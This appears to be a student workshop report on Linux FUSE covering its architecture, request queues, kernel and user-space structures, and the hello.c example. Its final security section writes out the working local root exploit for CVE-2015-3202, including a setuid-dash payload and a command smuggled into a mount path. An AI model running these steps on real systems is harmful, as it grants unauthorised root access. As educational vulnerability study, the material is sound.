# OSDI Workshop Report - Linux Fuse


## Introduction

* traits
    * not a real filesystem, but a process
    * load, register a fuse file-system driver with Linux VFS
    * fuse act as proxy
    * registers a block device /dev/fuse and set up  communication between kernel and fuse daemon

* pros
    * the crash of fuse filesystem does not affect the kernel
    * allow user to do more file operation in user space
    * more convenient to develop the filesystem with other applications, such as network-based filesystem
    * allow combination of GPL and non-GPL  

* cons
    * even the optimized version have poor performance compared with filesystem in kernel
    * occupy process resource

![](https://i.imgur.com/f3bOHx7.png)


* Workflow
    ![](https://i.imgur.com/SJkHOSe.png =x300)
    * request
        * User's application send request as normal file operation. 
        * And then, VFS transmit request by calling the file operation of registered file system.
        * Finally, /dev/fuse transmit the request to user-level fuse daemon.
    * reply
        * The reply from fuse daemon is exactly the same flow in the converse way

* Queue

    ![](https://i.imgur.com/LifOeSa.png)

    主要有5個queue：
    (1) interrupts: INTERRUPT requests in the interrupts queue, 最優先
    (2) forgets: FORGET requests in the forgets queue, 選擇很公平
    (3) pending: synchronous requests (e.g., metadata) in the pending queue.
    (4) processing: The oldest request in the pending queue is transferred to the user space and simultaneously moved to the processing queue.
    (5) background: The background queue is for staging asynchronous requests. read requests, write requests(writeback cache enabled)


* API
    * open
        ![](https://i.imgur.com/3Ty02ke.png)
        
        * Steps
            1. userlevel app調用glibc open接口，觸發sys_open系統調用。
            2. sys_open 調用fuse中inode節點定義的open方法。
            3. inode中open生成一個request，並通過/dev/fuse發送request消息到用戶態libfuse。
            4. Libfuse調用fuse_application用戶自定義的open的方法，並將返回值通過/dev/fuse通知給kernel。
            5. kernel收到request的處理完成的喚醒，並將結果放回給VFS系統調用結果。
            6. userlevel app收到open的reply。


    * write
        ![](https://i.imgur.com/HyjvMKD.png)
        
        * Steps
            1. 客戶端在mount目錄下面，對一個regular file調用write, 這一步是在用戶空間執行
            2. write內部會調用虛擬文件系統提供的一致性接口vfs_write 
            3. 根據FUSE模塊注冊的file_operations信息，vfs_write會調用fuse_file_aio_write，將寫請求放入fuse connection的request pending queue, 隨后進入睡眠等待應用程序reply
            4. 用戶空間的libfuse有一個守護進程通過函數fuse_session_loop輪詢雜項設備/dev/fuse, 一旦request queue有請求即通過fuse_kern_chan_receive接收
            5. fuse_kern_chan_receive通過read讀取request queue中的內容，read系統調用實際上是調用的設備驅動接口fuse_dev_read
            6. 在用戶空間讀取並分析數據，執行用戶定義的write操作，將狀態通過fuse_reply_write返回給kernel
            7. fuse_reply_write調用VFS提供的一致性接口vfs_write
            8. vfs_write最終調用fuse_dev_write將執行結果返回給第3步中等待在waitq的進程，此進程得到reply 后，write返回

    * mount
        ![](https://i.imgur.com/3kGEbgE.png)

        * FUSE模塊加載注冊了fuseblk_fs_type和fuse_fs_type兩種文件類型，默認情況下使用的是fuse_fs_type即mount 函數指針被初始化為fuse_mount,  而fuse_mount實際調用mount_nodev，它主要由如下兩步組成：
            1. sget(fs_type)搜索文件系統的超級塊對象(super_block)鏈表(type->fs_supers),如果找到一個與塊設備相關的超級塊，則返回它的地址。否則，分配並初始化一個新的超級塊對象，把它插入到文件系統鏈表和超級塊全局鏈表中，並返回其地址。
            2. fill_super(此函數由各文件系統自行定義): 這個函數式各文件系統自行定義的函數，它實際上是fuse_fill_super。一般fill_super會分配索引節點對象和對應的目錄項對象, 並填充超級塊字段值，另外對於fuse還需要分配fuse_conn,fuse_req。需要說明的是，它在底層調用了fuse_init_file_inode用fuse_file_operations和fuse_file_aops分別初始化inode->i_fop和inode->i_data.a_ops。

            * 在最后的fuse_fill_super部分，file就是通過mount傳進來的參數”fd=3”得到的，對應於打開的“/dev/fuse”。在掛載時候創建的superblock，fuse_conn, fuse_dev，file在這裡接起來了。

    
    * unlink
        ![](https://i.imgur.com/GjZ7V98.png)

* struct 
    * kernel space
        ![](https://i.imgur.com/LyZlNVY.png)
        
        * struct fuse_conn
            * 每一次mount會實例化一個struct fuse_conn即fuse connection, 它代表了用戶空間和內核的通信連接。fuse connection維護了包括pending list, processing list和io list在內的request queue，fuse connection通過這些隊列管理用戶空間和內核空間通信過程。
        * struct fuse_req
            * 每次執行系統調用時會生成一個struct fuse_req, 這些fuse_req依據state被組織在不同的隊列中，struct fuse_conn維護了這些隊列.
        * struct file
            * 存放打開文件與進程之間進行交互的有關信息，描述了進程怎樣與一個打開的文件進行交互，這類信息僅當進程訪問文件期間存在於內核內存中。
        * struct inode
            * 文件系統處理文件所需要得所有信息都放在一個名為inode(索引節點)的數據結構中。文件名可以隨時更改，但是索引節點對文件是唯一的，並且隨着文件的存在而存在。
        * struct file_operation
            * 定義了可以對文件執行的操作。

    * user space
        ![](https://i.imgur.com/TsS7ZCB.png)
        
        * struct fuse_req
            * 這個結構和上文中內核的fuse_req同名，有着類似的作用，但是數據成員不同。
        * struct fuse_session
            * 定義了客戶端管理會話的結構體，包含了一組對session可以執行的操作。
        * struct fuse_chan
            * 定義了客戶端與FUSE內核連接通道的結構體，包含了一組對channel可以執行的操作。
        * struct fuse_ll_ops
            * 結構的成員為一個函數指針func和命令名字符串name，內核中發過來的每一個request最后都映射到以此結構為元素的數組中。


## Usage
* libfuse/example/hello.c
    ![](https://i.imgur.com/L9pxgLf.png)


    ![](https://i.imgur.com/HNnZfau.png)

    ![](https://i.imgur.com/NjdHcie.png)
* getattr

    ![](https://i.imgur.com/5D4iGfJ.png)

* readdir

    ![](https://i.imgur.com/CF9kFUF.png)

* read

    ![](https://i.imgur.com/cPv5Sxh.png)

* open 
    
    ![](https://i.imgur.com/L9nzZsM.png)

* execution

    ![](https://i.imgur.com/9ouIrWr.png)

    ![](https://i.imgur.com/XPlu42R.png)

    ![](https://i.imgur.com/GdyRKr2.png)

* strace ./hello hfs

    ![](https://i.imgur.com/DDMMpRi.png)


## Security Issue - CVE-2015-3202
* Brief Introduction
    * fusermount in FUSE before 2.9.3-15 does not properly clear the environment before invoking (1) mount or (2) umount as root, which allows local users to write to arbitrary files via a crafted LIBMOUNT_MTAB environment variable that is used by mount's debugging feature.
* Root of Cause
    * setuid /bin/dash

* Steps
    * printf “chmod 4755 /bin/dash” > /tmp/exploit && chmod 755 /tmp/exploit
    * mkdir -p “/tmp/exploit||/tmp/exploit”
    * LIBMOUNT_MTAB=/etc/bash.bashrc _FUSE_COMMFD=0 fusermount “/tmp/exploit||/tmp/exploit”
    * cat /etc/bash.bashrc
    * ssh root@${target_ip}
    * sh -c “id”

* Demo

    ![](https://i.imgur.com/1m5hnCC.png)

    ![](https://i.imgur.com/w8piPaA.png)

    ![](https://i.imgur.com/nx7ZBEa.png)

* Patch

    ![](https://i.imgur.com/AEGZdF0.png)


## Reference
* Introduction
    * [wiki](https://zh.wikipedia.org/wiki/FUSE)
    * [用戶態文件系統框架FUSE的介紹及示例](https://kknews.cc/zh-tw/code/vvja6ry.html)
    * [Fuse流程分析](https://www.itdaan.com/tw/ef1c53dd4c47)
* Usage
    * [Linux FUSE（使用者態檔案系統）的使用：用libfuse建立FUSE檔案系統](https://www.itread01.com/hkpfiiq.html?fbclid=IwAR0Iw8Z52fJ6x_depjwChojS_iDfXPBj59jXkUSf0ohhfryKGDGjkqTUNeo)
* Paper
    * [slides](https://www.usenix.org/sites/default/files/conference/protected-files/fast17_slides_vangoor.pdf)
    * [To FUSE or Not to FUSE: Performance of
User-Space File Systems](http://libfuse.github.io/doxygen/fast17-vangoor.pdf)
    * [When eBPF Meets FUSE](https://events19.linuxfoundation.org/wp-content/uploads/2017/11/When-eBPF-Meets-FUSE-Improving-Performance-of-User-File-Systems-Ashish-Bijlani-Georgia-Tech.pdf)
* CVE-2015-3202
    * [FUSE CVE-2015-3202本地root權限提升漏洞及修復建議](https://www.secpulse.com/archives/32339.html)
    * [debian source code](https://sources.debian.org/src/fuse/2.9.3-15/util/mount_util.c/?hl=99#L99)
    * [exploitdb](https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/local/37089.txt)
    * [demo exploit for CVE-2015-3202 on Ubuntu](https://gist.github.com/taviso/ecb70eb12d461dd85cba)
    * [Ubuntu Debian FUSE Privilege Escalation CVE-2015-3202](https://www.youtube.com/watch?v=DXtB_zn0AM8)

## Q&A
1. FUSE daemon 會怎麼polling requests? /dev/fuse 怎麼 wake up daemon?
2. Fuse 會浪費多層的filesystem interface，有帶來什麼好處?
    * 上層(user-space)可能有更多發展，network的應用或加密的應用
    * 下層(kernel-space)確實會浪費不少資源，但是可以方便直接在 userspace 開發 filesystem，kernel 也比較不會被汙染
    * 在 [When eBPF Meets FUSE - Improving the performance of user file systems](https://events19.linuxfoundation.org/wp-content/uploads/2017/11/When-eBPF-Meets-FUSE-Improving-Performance-of-User-File-Systems-Ashish-Bijlani-Georgia-Tech.pdf) 有做比較
![](https://i.imgur.com/KfTc9yO.png)
